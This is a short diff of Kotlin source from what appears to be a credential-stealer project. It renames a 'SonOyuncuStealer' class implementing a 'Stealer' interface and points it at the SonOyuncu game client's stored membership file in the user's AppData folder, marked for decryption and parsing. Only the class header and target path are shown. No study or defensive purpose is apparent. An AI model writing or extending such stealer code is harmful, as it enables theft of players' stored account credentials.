@@ -1,15 +1,15 @@
-package io.groax.impl
+package io.groax.impl.stealer
 
 import com.google.common.base.Objects
 import com.google.gson.JsonObject
-import io.groax.api.*
-import org.apache.commons.io.FileUtils
+import io.groax.api.stealer.Stealer
+import io.groax.impl.Utilities
 import java.io.File
 
 /**
  * @author Groax
  */
-class SonOyuncuStealer : Stealer
+class SonOyuncu : Stealer
 {
     //We need parse first.
     override var encryptedLocation: File = File(System.getenv("appdata"), ".sonoyuncu" + File.separator + "sonoyuncu-membership.json")
